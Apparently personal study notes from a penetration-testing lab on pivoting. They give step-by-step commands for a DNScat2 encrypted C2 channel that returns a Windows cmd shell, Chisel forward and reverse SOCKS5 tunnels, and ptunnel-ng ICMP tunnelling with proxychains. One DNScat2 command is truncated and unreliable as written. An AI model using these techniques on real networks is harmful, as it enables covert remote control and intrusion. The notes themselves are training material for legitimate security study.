## #DNS tunnelling with [DNScat2](https://github.com/iagox86/dnscat2)
Uses DNS protocol to send data between 2 hosts, 
Uses an encrypted C2 channel. 
Sends data inside txt records. 
Can be extremely stealthy 

### Setup 
```shell
git clone https://github.com/iagox86/dnscat2.git
```
Set Up 
```shell
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
### Target SetUp
Need to provide the private key to the Windows Host, to encrypt data. 
Can use the client provided DNScat or use [dnscat2 with powershell](https://github.com/lukebaggett/dnscat2-powershell)
```shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
```powershell
Import-Module .\dnscat2.ps1
```
```powershell

0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
#### Check Session established 
```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

### Using DNS Cat 
```shell
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## #SOCKS5 #Tunnelling with [Chisel](https://github.com/jpillora/chisel)
### Bind Shell
#### Setting up Chisel 
```shell
git clone https://github.com/jpillora/chisel.git
```
#### Build the library
```shell
cd chisel
go build
```
#### Transfer Chisel Binary on Pivot Host 
```shell
scp chisel ubuntu@10.129.202.64:~/
```
#### Run Chisel on the host 
```shell
./chisel server -v -p 1234 --socks5
```
#### Connect to the Chisel server from attacking machine 
```shell
./chisel client -v 10.129.202.64:1234 socks
```
#### Edit /etc/proxychains.conf
```shell
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
#### Usage example 
```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /scale-desktop:200 /scale:180
```
### Reverse Shell
On local machine 
```shell
sudo ./chisel server --reverse -v -p 1234 --socks5
```

On Pivot host 
```shell
./chisel client -v 10.10.14.17:1234 R:socks
```

proxychains.conf
```shell
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

## #ICMP Tunnelling with SOCKS
Encapsulates packets with ICMP packets and echo requests + responses
Only works when ping requests are allowed 
### ptunnel-ng
```shell
git clone https://github.com/utoni/ptunnel-ng.git
```
Build the Tunnel 
```shell
sudo ./autogen.sh 
```
Copy to pivot host 
```shell
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
Start the tunnel server on the target host 
```shell
/src sudo ./ptunnel-ng -r<pivotIP NoSpace> -R22
```
Connect to the tunnel from the attack host 
```shell
sudo ./ptunnel-ng -p<pivotIP NoSpace> -l2222 -r<local ip> -R22
```
### Tunneling ssh through ICMP 
```shell
ssh -p2222 -lubuntu 127.0.0.1
```
### Enable dynamic port forwarding over #ssh 
```shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
#### #Proxychaining 
```shell
proxychains nmap -sV -sT 172.16.5.19 -p3389
```
